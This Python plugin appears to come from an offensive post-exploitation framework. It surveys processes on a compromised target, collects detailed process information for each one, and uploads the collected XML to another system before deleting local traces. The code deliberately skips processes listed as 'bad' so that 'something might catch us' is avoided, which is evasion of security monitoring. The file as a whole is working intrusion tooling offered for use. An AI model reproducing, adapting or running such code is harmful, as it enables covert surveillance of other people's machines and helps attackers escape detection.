
import os, stat
import shutil
import dsz
import ops, ops.db, ops.survey
import util
import ops.processes.processlist
BAD_PROCS = os.path.normpath(('%s/Ops/Data/bad_processes.txt' % ops.RESDIR))

def main():
    from globalconfig import config
    import sendfile
    bad = []
    with open(BAD_PROCS) as input:
        for i in input:
            bad.append(i.strip().lower())
    procs = ops.processes.processlist.get_processlist()
    for proc in procs:
        if (proc.name.lower().strip() in bad):
            ops.warn(('Skipping PID %d (%s), something might catch us.' % (proc.id, proc.name)))
            continue
        elif ((proc.name == '') or (proc.name == 'System') or (proc.id == 0)):
            ops.info(('Skipping PID %d (%s)' % (proc.id, proc.name)))
            continue
        else:
            procinfo_cmd = ops.cmd.getDszCommand('processinfo', id=proc.id)
            procinfo_cmd.execute()
            if (procinfo_cmd.success != 1):
                ops.error(('Could not query process info for PID %d (%s)' % (proc.id, proc.name)))
            else:
                ops.info(('Got processinfo for PID %d (%s)' % (proc.id, proc.name)))
    ops.info('Copying up to FresStep...')
    xmldir = os.path.normpath(('%s/Data' % ops.LOGDIR))
    files = util.listdir(xmldir, '.*processinfo.*\\.xml')
    tmpdir = os.path.join(config['paths']['tmp'], ('freshstep_%s_%s' % (ops.PROJECT, ops.TARGET_IP)))
    os.makedirs(tmpdir)
    ops.info(('Local temporary working directory: %s' % tmpdir))
    for i in files:
        shutil.copy(os.path.normpath(('%s/%s' % (xmldir, i))), tmpdir)
        os.chmod((os.path.normpath('%s/%s') % (tmpdir, i)), (stat.S_IREAD | stat.S_IWRITE))
    try:
        sendfile.main(tmpdir)
    except:
        import traceback
        traceback.print_exc()
        ops.error('Failed to copy fast.')
    shutil.rmtree(tmpdir)
    ops.info('Removed temporary files.')
    ops.cmd.quickrun(('warn \\"ProcessDeep completed for %s\\"' % ops.TARGET_ADDR))
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()